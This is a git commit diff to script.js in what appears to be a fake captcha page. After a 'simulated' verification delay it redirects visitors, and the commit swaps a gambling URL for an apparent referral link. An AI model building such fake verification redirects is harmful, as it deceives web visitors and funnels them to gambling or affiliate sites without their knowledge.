8288a743afa1536716cc621d0f52ac302639f95e
manish261panchal <manish@reclamedigital.com>
2024-08-14 12:00:10 +0530

    Update script.js

--- script.js
+++ script.js
@@ -22,7 +22,7 @@ function startCaptcha() {
 
         // Redirect to the main site after a delay
         setTimeout(() => {
-            window.location.href = "https://pin-up-win.in/plinko/"; // Redirect URL
+            window.location.href = "https://pugo23ref.com/XF5TtGkA/"; // Redirect URL
         }, 1500); // 1.5 seconds delay before redirect
     }, 2000); // Simulated processing time (2 seconds)
 }
